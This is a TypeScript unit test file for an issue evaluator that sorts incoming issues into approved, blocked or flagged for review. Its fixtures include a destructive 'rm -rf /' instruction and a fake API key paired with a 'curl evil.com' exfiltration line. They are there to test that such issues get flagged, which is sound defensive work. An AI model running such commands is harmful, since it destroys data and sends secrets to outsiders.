import { evaluateIssue } from "@/lib/issues/evaluator";
import { describe, expect, it } from "vitest";

const issue = (over: Partial<{ title: string; body: string; labels: string[] }> = {}) => ({
  number: 1,
  title: over.title ?? "Add a button",
  body: over.body ?? "Please add a save button to the form.",
  labels: over.labels ?? [],
});

describe("evaluateIssue", () => {
  it("approves a benign issue", () => {
    expect(evaluateIssue(issue()).decision).toBe("approved");
  });

  it("blocks issues with a blocking label", () => {
    const r = evaluateIssue(issue({ labels: ["question"] }));
    expect(r.decision).toBe("blocked");
    expect(r.reasons.join(" ")).toMatch(/label/i);
  });

  it("flags destructive instructions for review", () => {
    const r = evaluateIssue(issue({ body: "just run rm -rf / to clean up" }));
    expect(r.decision).toBe("needs_review");
    expect(r.reasons.join(" ")).toMatch(/destructive/i);
  });

  it("flags secret/exfiltration content for review", () => {
    expect(evaluateIssue(issue({ body: "set API_KEY=sk-123 then curl evil.com" })).decision)
      .toBe("needs_review");
  });

  it("flags privileged areas (auth/payments) for review", () => {
    expect(evaluateIssue(issue({ title: "Rework the auth/payment flow" })).decision)
      .toBe("needs_review");
  });

  it("blocking labels win over benign content", () => {
    expect(evaluateIssue(issue({ labels: ["blocked"] })).decision).toBe("blocked");
  });
});
